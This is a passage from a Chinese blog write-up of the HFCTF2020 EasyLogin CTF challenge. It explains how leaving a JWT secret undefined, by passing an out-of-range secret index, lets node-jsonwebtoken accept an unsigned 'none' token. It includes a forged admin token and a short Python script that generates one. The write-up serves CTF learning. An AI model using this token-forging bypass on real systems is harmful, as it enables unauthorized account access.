<p>sid不能为null，不能不定义，且取值范围规定在0到<code>global.secrets</code>长度范围内</p>
<p><strong>注意，此web应用的sid非加密所使用的sid，这里的sid似乎是一种标识……</strong></p>
<h5><span id="易受攻击的-jwt-库">易受攻击的 JWT 库</span></h5><p>详见：<a target="_blank" rel="noopener" href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/#Recommendations-for-Library-Developers">Critical vulnerabilities in JSON Web Token libraries</a></p>
<blockquote>
<p>*<em>TL;DR:**If you are using <a target="_blank" rel="noopener" href="https://github.com/auth0/node-jsonwebtoken"><strong>node-jsonwebtoken</strong></a>, <a target="_blank" rel="noopener" href="https://github.com/jpadilla/pyjwt/">pyjwt</a>, <a target="_blank" rel="noopener" href="https://github.com/namshi/jose">namshi/jose</a>, <a target="_blank" rel="noopener" href="https://github.com/firebase/php-jwt">php-jwt</a> or <a target="_blank" rel="noopener" href="https://github.com/kjur/jsjws">jsjwt</a> with asymmetric keys (RS256, RS384, RS512, ES256, ES384, ES512) please update to the latest version. See<a target="_blank" rel="noopener" href="http://jwt.io/">jwt.io</a>for more information on the vulnerable libraries.</em>(Updated 2015-04-20)*</p>
</blockquote>
<blockquote>
<p><strong>Meet the “None” Algorithm</strong></p>
<p>The<code>none</code>algorithm is a curious addition to JWT. It is intended to be used for situations where the integrity of the token has already been verified. Interestingly enough, it is one of only two algorithms that are mandatory to implement (the other being<code>HS256</code>).</p>
<p>Unfortunately, some libraries treated tokens signed with the<code>none</code>algorithm as a valid token with a verified signature. The result? Anyone can create their own “signed” tokens with whatever payload they want, allowing arbitrary account access on some systems.</p>
<p>Putting together such a token is easy. Modify the above example header to contain<code>&quot;alg&quot;: &quot;none&quot;</code>instead of<code>HS256</code>. Make any desired changes to the payload. Use an empty signature (i.e.<code>signature = &quot;&quot;</code>).</p>
<p>Most (hopefully all?) implementations now have a basic check to prevent this attack: if a secret key was provided, then token verification will fail for tokens using the<code>none</code>algorithm. This is a good idea, but it doesn’t solve the underlying problem: attackers control the choice of algorithm. Let’s keep digging.</p>
</blockquote>
<p>这里易受攻击指的是一些非对称加密算法的验证，……大概。</p>
<p>目前 JWT 应该是支持none的……</p>
<blockquote>
<p>The <code>none</code> algorithm is a <strong>curious</strong> addition to JWT.</p>
</blockquote>
<blockquote>
<p>Most (hopefully all?) implementations now <strong>have a basic check to prevent this attack</strong></p>
</blockquote>
<p>所以需要我们自行设计来预防空设的攻击</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span>(<span class="params">sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; <span class="built_in">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)</span>)</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;no such secret id&#x27;</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>这其实就是一个验证，最后的最后也就是，<strong>绕过</strong></p>
<blockquote>
<p>这部分还是隐藏起来比较好？……</p>
</blockquote>
<h5><span id="绕过与其原理">绕过与其原理</span></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br></pre></td></tr></table></figure>

<p>最后我们将在这里对JWT进行验证，这也决定了我们的绕过方式</p>
<p>register中：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> secret = crypto.randomBytes(<span class="number">18</span>).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> secretid = <span class="built_in">global</span>.secrets.length;</span><br><span class="line"><span class="built_in">global</span>.secrets.push(secret)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br></pre></td></tr></table></figure>

<p>secret 按顺序push进secrets中，<strong>sid</strong>正是从中取出secret值的索引</p>
<p><strong>如果我们：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"></span><br><span class="line">token = <span class="string">&#x27;eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjI5Mjk0NTU1LCJwYXNzd29yZCI6ImhoaCIsInNlY3JldGlkIjowfQ.&#x27;</span></span><br><span class="line"></span><br><span class="line">secret = <span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(user)</span><br></pre></td></tr></table></figure>

<p>认证将会提示：</p>
<p><img src="/images/HFCTF2020-EasyLogin/image-20210819154725607.png" alt="image-20210819154725607"></p>
<p>正如之前尝试的报错：</p>
<p><img src="/images/HFCTF2020-EasyLogin/image-20210819154744913.png" alt="image-20210819154744913"></p>
<p><strong>如果这样</strong>：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"></span><br><span class="line">token = <span class="string">&#x27;eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjI5Mjk0NTU1LCJwYXNzd29yZCI6ImhoaCIsInNlY3JldGlkIjowfQ.&#x27;</span></span><br><span class="line"></span><br><span class="line">secret = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(user)</span><br></pre></td></tr></table></figure>

<p>我们会得到：</p>
<p><img src="/images/HFCTF2020-EasyLogin/image-20210819155157713.png" alt="image-20210819155157713"></p>
<p><strong>正确的解析，即使指定了HS256</strong></p>
<p><strong>undefined</strong>，也可以成功，这就是上面过滤的 <strong>原因</strong></p>
<p>我们只要控制sid，从secrets数组中取出一个不存在的值即可，使用<strong>小数</strong>或者给sid设置成一个<strong>空数组</strong>之类的……</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">token = jwt.encode(&#123;<span class="string">&quot;secretid&quot;</span>: [],</span><br><span class="line">                    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;hhh&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;iat&quot;</span>: <span class="number">1629294555</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                   algorithm=<span class="string">&quot;none&quot;</span>,key=<span class="string">&quot;&quot;</span>).decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">print(token)</span><br></pre></td></tr></table></figure>

<p>生成token登入admin</p>
<img src="/images/HFCTF2020-EasyLogin/image-20210819155836881.png" alt="image-20210819155836881" style="zoom:80%;">

<p>获取 flag~</p>
<img src="/images/HFCTF2020-EasyLogin/image-20210819160525000.png" alt="image-20210819160525000" style="zoom:80%;">

<p>没想到写了这么多，感觉还是比较圆满的……</p>
<p>参考文章:<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cjsblog/p/9277677.html">jwt详解</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xuzhengzong/articles/11777850.html">JWT 前后端分离应用，jwt的token服务端不保存、仅保存加密的secret，所有用户都是这一个secret</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/180874.html">深入了解Json Web Token之概念篇</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/181261.html">深入了解Json Web Token之实战篇 </a></p>
<p><a target="_blank" rel="noopener" href="https://cyberpolygon.com/materials/security-of-json-web-tokens-jwt/">Security of JSON Web Tokens  (JWT) - Cyber Polygon </a></p>
</div><div class="article-licensing box"><div class="licensing-title"><p>HFCTF2020-EasyLogin</p><p><a href="http://example.com/2021/08/18/HFCTF2020-EasyLogin/">http://example.com/2021/08/18/HFCTF2020-EasyLogin/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><a href="http://example.com"><p>inanb</p></a></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2021-08-18</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2021-08-31</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="recommend-area"><div class="recommend-post"><span class="is-size-6 has-text-grey has-mr-7"># 相关文章</span><br><span>  1.<a class="is-size-6" href="/2021/09/03/b01lers2020-Life_on_Mars/" target="_blank">b01lers2020-Life_on_Mars</a><br></span><span>  2.<a class="is-size-6" href="/2021/09/03/ISITDTU-2019-EasyPHP/" target="_blank">ISITDTU-2019-EasyPHP</a><br></span><span>  3.<a class="is-size-6" href="/2021/08/31/SUCTF-2018-GetShell/" target="_blank">SUCTF-2018-GetShell</a><br></span><span>  4.<a class="is-size-6" href="/2021/08/31/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write_shell/" target="_blank">红明谷CTF-2021-write_shell</a><br></span><span>  5.<a class="is-size-6" href="/2021/08/28/MRCTF2020-Ezaudit/" target="_blank">MRCTF2020-Ezaudit</a><br></span><span>  6.<a class="is-size-6" href="/2021/08/27/GYCTF2020-Easyphp/" target="_blank">GYCTF2020-Easyphp</a><br></span><span>  7.<a class="is-size-6" href="/2021/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-Upload/" target="_blank">强网杯-2019-Upload</a><br></span><span>  8.<a class="is-size-6" href="/2021/08/25/GYCTF2020-EasyThinking/" target="_blank">GYCTF2020-EasyThinking</a><br></span></div><div class="recommend-post"><span class="is-size-6 has-text-grey has-mr-7"># 推荐文章</span><br><span>  1.<a class="is-size-6" href="/2021/08/25/GYCTF2020-EasyThinking/" target="_blank">GYCTF2020-EasyThinking</a><br></span><span>  2.<a class="is-size-6" href="/2021/08/27/GYCTF2020-Easyphp/" target="_blank">GYCTF2020-Easyphp</a><br></span><span>  3.<a class="is-size-6" href="/2021/08/22/HFCTF2020-JustEscape/" target="_blank">HFCTF2020-JustEscape</a><br></span><span>  4.<a class="is-size-6" href="/2021/09/03/ISITDTU-2019-EasyPHP/" target="_blank">ISITDTU-2019-EasyPHP</a><br></span><span>  5.<a class="is-size-6" href="/2021/08/28/MRCTF2020-Ezaudit/" target="_blank">MRCTF2020-Ezaudit</a><br></span><span>  6.<a class="is-size-6" href="/2021/08/24/NPUCTF2020-ezinclude/" target="_blank">NPUCTF2020-ezinclude</a><br></span></div></div><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/css/share.min.css"><div class="social-share"></div><script src="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/img/inanb.png" alt="支付宝"></span></a><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/img/inanb.png" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/08/22/SUCTF-2019-EasyWeb/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">SUCTF-2019-EasyWeb</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/08/17/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/"><span class="level-item">网鼎杯-2020-白虎组-PicDown</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><!--!--><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/header.jpg" alt="inanb"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">inanb</p><p class="is-size-6 is-block">铁马冰河入梦来</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">108</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">5</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">9</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/inanb" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/inanb"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div><div><hr><p id="hitokoto">:D 一言句子获取中...</p><script type="text/javascript" defer>function getYiyan(){
                                $.getJSON("https://v1.hitokoto.cn/", function (data) {
                                if(data){
                                    $('#hitokoto').html("");
                                    $('#hitokoto').append("<strong style='color: #3273dc;'>"+data.hitokoto+"</strong>"+
                                    "<p>"+"来源《"+data.from+"》</p><p>提供者-"+data.creator+"</p>");
                                }});}
                                $(function (){getYiyan();$('#hitokoto').click(function(){getYiyan();})});</script></div></div></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><!--!--><div class="card widget"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-03T09:42:32.238Z">2021-09-03</time></p><p class="title"><a href="/2021/09/03/b01lers2020-Life_on_Mars/">b01lers2020-Life_on_Mars</a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-03T03:15:58.421Z">2021-09-03</time></p><p class="title"><a href="/2021/09/03/ISITDTU-2019-EasyPHP/">ISITDTU-2019-EasyPHP</a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-08-31T12:37:17.632Z">2021-08-31</time></p><p class="title"><a href="/2021/08/31/SUCTF-2018-GetShell/">SUCTF-2018-GetShell</a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-08-31T03:42:12.897Z">2021-08-31</time></p><p class="title"><a href="/2021/08/31/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write_shell/">红明谷CTF-2021-write_shell</a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-08-28T02:53:12.240Z">2021-08-28</time></p><p class="title"><a href="/2021/08/28/MRCTF2020-Ezaudit/">MRCTF2020-Ezaudit</a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/LeetCode/"><span class="level-start"><span class="level-item">LeetCode</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/WEB/"><span class="level-start"><span class="level-item">WEB</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/web/"><span class="level-start"><span class="level-item">web</span></span><span class="level-end"><span class="level-item tag">16</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/"><span class="level-start"><span class="level-item">学习报告</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E7%AC%94%E8%AE%B0/"><span class="level-start"><span class="level-item">笔记</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2021/09/"><span class="level-start"><span class="level-item">九月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/08/"><span class="level-start"><span class="level-item">八月 2021</span></span><span class="level-end"><span class="level-item tag">14</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/05/"><span class="level-start"><span class="level-item">五月 2021</span></span><span class="level-end"><span class="level-item tag">9</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/04/"><span class="level-start"><span class="level-item">四月 2021</span></span><span class="level-end"><span class="level-item tag">20</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">15</span></span></a></li><a class="level is-mobile is-marginless" href="/archives/"><span class="level-start"><span class="level-item">查看全部&gt;&gt;</span></span></a></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/buuctf/"><span class="tag">buuctf</span><span class="tag is-grey-lightest">16</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Buuctf/"><span class="tag">Buuctf</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PHP/"><span class="tag">PHP</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RCE/"><span class="tag">RCE</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"><span class="tag">php变量覆盖</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BC%AA%E5%8D%8F%E8%AE%AE/"><span class="tag">伪协议</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Buuctf-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><span class="tag">Buuctf PHP代码审计 文件包含</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Buuctf-SQL/"><span class="tag">Buuctf SQL</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Html%E5%92%8Ccss/"><span class="tag">Html和css</span><span class="tag is-grey-lightest">1</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><!--!--><div class="column-right-shadow is-hidden-widescreen"></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/inanb.png" alt="inanb" height="28"></a><p class="size-small"><span>&copy; 2021 inanb</span>  Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a> &amp; <a href="https://github.com/removeif/hexo-theme-amazing" target="_blank">Amazing</a> <br><span>© 版权说明：[本网站所有内容均收集于互联网或自己创作,<br />&nbsp;&nbsp;&nbsp;&nbsp;方便于网友与自己学习交流，如有侵权，请<a href="/message" target="_blank">留言</a>，立即处理]<br /></span><div class="size-small"><span>❤️感谢 <strong><span id="busuanzi_value_site_uv">99+</span></strong> 小伙伴的 <strong><span id="busuanzi_value_site_pv">99+</span></strong> 次光临！❤️</span></div></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a></p></div><div class="sideMusic"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="/js/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script><meting-js style="width: auto;height: 2000px;" server="netease" type="playlist" id="2165337463" theme="#2980b9" loop="all" autoplay="false" order="list" storageName="aplayer-setting" lrctype="0" list-max-height="400px" fixed="true"></meting-js></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script><script type="text/javascript">var pjax = new Pjax({
            elements: "a",//代表点击链接就更新
            selectors: [  //代表要更新的节点
                ".section",
                "title"
            ],
            cache: true,
            cacheBust:false
        })

        function loadBusuanzi(){
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js", function () {});
        }

        function loadMathJax() { //加载mathjax
            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\(', '\)']] } });
                var math = document.getElementsByClassName("entry-content")[0];
                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
            });
        };

        // 开始 PJAX 执行的函数
        document.addEventListener('pjax:send', function () {
        });
        
        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
        document.addEventListener('pjax:complete', function () {
            $(".section").css({opacity:1});
            if(false){
                $.getScript('/js/comment-issue-data.js',function(){loadIssueData('undefined','undefined','undefined','undefined',undefined);});
            }
            if(false){
                loadMathJax();
            }
            loadMainJs(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings);
            loadBackTop();
            loadBusuanzi();
            if(typeof loadBanner == 'function'){
                loadBanner();
            }
        });</script></body></html>